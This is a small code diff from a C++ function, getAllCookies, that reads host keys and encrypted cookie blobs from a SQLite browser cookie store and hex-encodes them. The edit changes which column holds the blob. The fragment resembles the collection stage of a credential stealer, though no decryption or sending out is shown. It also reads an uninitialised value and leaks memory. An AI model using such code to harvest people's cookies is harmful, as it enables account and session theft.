@@ -177,14 +177,15 @@ json getAllCookies(const char * temp){
 
         json res;
         res["HOST_KEY"] = (char*)sqlite3_column_text(pStmt, 0);
+
         //res["path"] = (char *) sqlite3_column_text(pStmt, 1);
     
         DATA_BLOB encryptedPass;
         DWORD *d = (DWORD *)malloc(sizeof(DWORD));
         encryptedPass.cbData = *d;
-        encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
+        encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 1);
         encryptedPass.pbData = (BYTE *)malloc((int)encryptedPass.cbData);
-        memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);
+        memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 1), (int)encryptedPass.cbData);
         res["encrypted value"] = hexStr(encryptedPass.pbData, encryptedPass.cbData);
         //free(data);
         //free(encryptedPass.pbData);
